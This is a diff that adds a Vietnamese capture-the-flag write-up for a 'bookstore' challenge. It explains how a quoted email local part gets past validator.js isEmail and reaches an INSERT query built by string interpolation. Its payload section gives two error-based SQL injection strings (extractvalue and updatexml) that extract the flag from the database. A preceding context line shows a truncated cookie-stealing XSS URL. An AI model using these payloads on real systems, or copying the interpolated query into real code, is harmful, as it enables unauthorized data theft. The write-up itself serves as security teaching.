@@ -142,3 +142,39 @@ http://localhost:9988/changehonk?newhonk[amountoftimeshonked]=3Cscript%3Evar%20i
 
 #### Giải thích 
 Hàm visit() sẽ truy cập vào url, nên ta sẽ cho truy cập vào localhost:9988 để flag cookie được set, khi ta truy cập vào /changehonk thì cookie honk  sẽ được set honk = req.query.newhonk, sau đấy sẽ redirect về /, sau khi redirect về /, sẽ tiến hành kiểm tra liệu cookie honk có phải là object, vì ta muốn bypass filter XSS nên ta sẽ cho cookie honk thành object, cookie honk sẽ được render và XSS sẽ xảy ra và gửi request tới server của ta với cookie. 
+
+# bookstore
+Challenge cho ta các source nên ta sẽ tiến hành xem qua các file.
+
+Bắt đầu là file validator.js, ta thấy function validateEmail() sẽ dùng isEmail của thư viện validator. Ta tiến hành tìm source code của validator trên google và ta sẽ có code của  ![isEmail](https://github.com/validatorjs/validator.js/blob/86a07ba4f3f710f639e92a62cf81dd3321ef9ee8/src/lib/isEmail.js) Tiến hành đọc qua code thì ta sẽ thấy 
+```javascript
+  if (user[0] === '"') {
+    user = user.slice(1, user.length - 1);
+    return options.allow_utf8_local_part ?
+      quotedEmailUserUtf8.test(user) :
+      quotedEmailUser.test(user);
+  }
+```
+Xét email format: user@domain
+
+isEmail sẽ xét phần user nếu user bắt đầu bằng " thì nó sẽ hiểu rằng chuỗi có dạng "something" sau đấy sẽ chuyển thành something mà không tiến hành filter bất cứ kí tự nào trong " ". Hàm validateEmail() sẽ thực thi khi ta tiến hành đăng ký email với option kindle, nên ta sẽ nhìn qua source code:
+```javascript
+ insertEmail(email, book_id) {
+        const query = `INSERT INTO requests(email, book_id) VALUES('${email}', '${book_id}');`;
+        return new Promise((resolve, reject) => {
+            this.db.query(query, (error) => {
+                if (error != null) {
+                    reject(error);
+                } else {
+                    resolve(null);
+                }
+            })
+        })
+    }
+```
+Tại đây ta có ý tưởng sẽ kết thúc câu lệnh insert và chạy thêm câu lệnh update, cho titile sẽ mang giá trị của texts để ta lấy flag, nhưng vì hàm isEmail giới hạn số kí tự, nên ta sẽ tìm cách khác, ta thấy rằng khi có lỗi xảy ra sẽ được hiển thị => Error Based Injection, tại đây ta có thể dùng updatexml hoặc là extractxml để tiến hành:
+### Payload:
+"',extractvalue(1,concat(1,(SELECT texts from books limit 1))))#@gmail.com
+
+"',updatexml(1,concat(1,(SELECT texts from books limit 1)),1))#@gmail.com
+
